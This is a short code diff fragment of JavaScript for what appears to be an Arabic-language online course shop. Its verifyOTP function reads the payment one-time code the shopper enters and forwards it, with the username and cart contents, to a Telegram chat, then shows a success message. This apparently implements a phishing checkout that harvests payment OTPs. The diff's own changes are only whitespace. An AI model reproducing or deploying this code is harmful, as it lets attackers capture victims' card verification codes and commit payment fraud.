+}
+
 
 function verifyOTP() {
     const otp = document.getElementById('otpCode').value;
@@ -522,10 +684,10 @@ function verifyOTP() {
         alert('يرجى إدخل رقم OTP صحيح');
         return;
     }
-    
+   
     const cartList = cart.map(item => `• ${item.name} - ${item.price} جنيه`).join('\n');
     sendToTelegram(`🔐 <b>تم تأكيد الدفع من ${currentUser.username}!</b>\nكود OTP: <code>${otp}</code>\nالكورسات:\n${cartList}\n⏰ ${new Date().toLocaleString('ar-EG')}`);
-    
+   
     document.getElementById('otpSection').style.display = 'none';
     setTimeout(() => {
         document.getElementById('successMsg').style.display = 'block';
@@ -533,6 +695,7 @@ function verifyOTP() {
         document.getElementById('count').innerText = '0';
     }, 500);
 }
+
 
 function closePayment() {
     document.getElementById('paymentModal').remove();
